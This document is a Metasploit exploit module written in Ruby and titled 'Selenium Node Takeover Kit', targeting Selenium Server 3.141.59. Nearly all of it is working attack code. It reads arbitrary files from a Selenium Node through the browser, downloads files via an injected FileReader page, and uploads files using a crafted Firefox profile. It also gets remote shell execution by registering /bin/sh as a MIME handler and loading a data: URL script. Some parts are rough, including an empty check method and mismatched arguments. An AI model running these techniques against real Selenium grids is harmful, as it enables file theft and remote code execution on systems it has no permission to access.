# Exploit Title: Selenium Node Takeover Kit
# Date: 11/??/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: Basically a minimal version of Selenium Node Download. Rather than try build an inline HTML form, this just loads the file like “file:///tmp/blah.txt” and dumps the loaded page. This is useful for like small text files, and just for testing interaction with the file-system on a Selenium Node.

# INSTALL: To install, copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "REMOTE_FILE" to the path and name of file on the NODE (example: /tmp/blah.txt).

require 'json'
require 'zip'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Takeover Kit',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to cat a file.
        Basically it uses the browser to load a text file into the browser
        then it dumps the page text.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL.', '/wd/hub']),
        OptString.new('REMOTE_FILE', [false, 'The remote file be uploaded to, downloaded from, or catted.']),
        OptString.new('LOCAL_FILE', [false, 'The local file to be uploaded or downloaded too.']),
        OptString.new('BROWSER', [false, 'The BrowserName to use.', 'firefox']),
        OptString.new('SHELL_COMMAND', [false, 'The shell command to execute', 'rm $0; echo success > /tmp/selenium_node_rce.txt']),
        OptString.new('COMMAND_TYPE', [false, 'upload/download/cat/command', 'cat'])
      ])
  end

  def check
     
  end

  def exploit
    sessionId = start_session

    #rce_firefox sessionId
    cat sessionId
    #download sessionId
    #upload sessionId

    end_session sessionId
  end

  def start_session
    browser = datastore['BROWSER']

    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:desiredCapabilities => {:browserName => browser}})
    })
    sessionId = res.get_json_document["value"]["sessionId"] ? res.get_json_document["value"]["sessionId"] : res.get_json_document["sessionId"]

    unless sessionId
      fail_with(Failure::NotFound, "Failed to start session.")
    end
    print_good("Created Session: #{sessionId}")

    return sessionId
  end

  def end_session (sessionId)
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId)
    }, nil)
  end

  def rce_firefox
    browser = datastore['BROWSER']

    payload = 'rm -rf $0
    echo success > /tmp/selenium_node_rce.txt'
    data_url = "data:application/sh;charset=utf-16le;base64,%s" % [Base64.encode64(payload)]

    # Build profile zip file.
    stringio = Zip::OutputStream::write_buffer do |io|
      # Create a handler for shell scripts
      io.put_next_entry("handlers.json")
      io.write('{"defaultHandlersVersion":{"en-US":4},"mimeTypes":{"application/sh":{"action":2,"handlers":[{"name":"sh","path":"/bin/sh"}]}}}')
    end
    stringio.rewind
    encoded_profile = Base64.strict_encode64(stringio.sysread)

    # Start session. driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => { :browserName => browser }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:desiredCapabilities => {:browserName => browser, :firefox_profile => encoded_profile}})
    })
    sessionId = res.get_json_document["value"]["sessionId"] ? res.get_json_document["value"]["sessionId"] : res.get_json_document["sessionId"]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => data_url})
    }, nil)
  end

  def download (sessionId)
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    #driver.get(...)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'url'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:url => 'data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>'})
    })

    #driver.find_element(id: 'f').send_keys(remote_file)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:using => 'css selector', :value => '#f'})
    })
    elementId = res.get_json_document["value"].values[0]

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'element', elementId, 'value'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:text => remote_file, :value => remote_file.split()})
    })

    # js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'session', sessionId, 'execute', 'sync'),
      'ctype'  => 'application/json; charset=utf-8',
      'data'   => JSON.generate({:args => [], :script => "return(inf)"})
    })
    decoded_contents = Base64.decode64(res.get_json_document["value"].split(',')[1])

    if local_file
      File.open(local_file, 'wb') do |f|
        f.write(decoded_contents)
      end
    else
      print(decoded_contents)
    end
  end

  def upload_firefox
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    href = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]

    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [href, File::basename(remote_file)]

    # Build profile zip file.
    stringio = Zip::OutputStream::write_buffer do |io|
      # Allows us to download files without being prompted.
      io.put_next_entry("prefs.js")
      io.write('user_pref("browser.download.dir", "%s");
user_pref("browser.download.folderList", 2);
user_pref("browser.helperApps.neverAsk.saveToDisk", "application/octet-stream;");' % [File::dirname(remote_file)])
    end
    stringio.rewind
    encoded_profile = Base64.strict_encode64(stringio.sysread)

    # Create session with our new profile
    newSession = {:desiredCapabilities => {:browserName => "firefox", :firefox_profile => encoded_profile}}

    uri = URI.parse(target_uri)
    http = Net::HTTP.new(uri.host, uri.port)

    # Start session with encoded_profile and save session id for cleanup.
    uri = URI.parse("%s/session" % [target_uri])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate(newSession)
    response = http.request(request)
    sessionId = JSON.parse(response.body)["value"]["sessionId"] ? JSON.parse(response.body)["value"]["sessionId"] : JSON.parse(response.body)["sessionId"]

    # URL.
    uri = URI.parse("%s/session/%s/url" % [target_uri, sessionId])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate(:url => data_url)
    response = http.request(request)

    # Element.
    uri = URI.parse("%s/session/%s/element" % [target_uri, sessionId])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate(:using => 'css selector', :value => '#f')
    response = http.request(request)
    elementId = JSON.parse(response.body)["value"].values[0]

    # Element Click.
    uri = URI.parse("%s/session/%s/element/%s/click" % [target_uri, sessionId, elementId])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate({})
    response = http.request(request)
  end
end
